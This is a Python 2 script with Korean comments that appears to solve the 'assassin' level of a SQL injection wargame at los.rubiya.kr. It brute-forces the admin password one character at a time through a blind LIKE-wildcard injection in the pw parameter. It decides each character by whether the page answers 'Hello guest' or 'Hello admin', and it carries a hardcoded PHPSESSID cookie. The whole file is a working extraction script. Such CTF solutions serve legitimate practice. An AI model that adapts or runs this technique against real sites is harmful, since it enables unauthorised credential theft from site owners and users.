#!/usr/bin/python
#-*-coding:utf-8  -*-

#guest = 90D2FE10
# Blind SQL Injection 문자 찾기!!
import urllib,urllib2,requests


password=""
guestword=""

for j in range(1,9):                            # 1~8자리 패스워드를 찾아야함
  print "%d" %j                                 # 현재 몇번째 인지 표시
  for i in range(48,128):                       # 대부분의 글자들 다 찾아내기
	if(48<=i<=57 or 65<=i<=90):
		url="https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw="+password+chr(i)+"%"
		r = requests.post(url,cookies=(dict(PHPSESSID="nrlsfm5sf4fmh67tv514lgn4jl"))) # 자신의 Session ID를 넣어야함.
		print str(j)+"번째 찾는 중 : "+chr(i)     # 대략적인 현재 위치를 확인하기 위함, 없어도 되는 코
		if 'Hello guest' in r.text:                 # 글자를 찾았을 경우!
			guestword = chr(i)
			print "guest password found... but hold on a second plz..."
		
		elif 'Hello admin' in r.text:
			print "password found!"  
			password = password + chr(i)
			print "[+]Password : " + password
			break

		elif i == 90:
			print "Admin's password is same as guest password"
			password = password + guestword
			print "[+]Password : " + password
			break
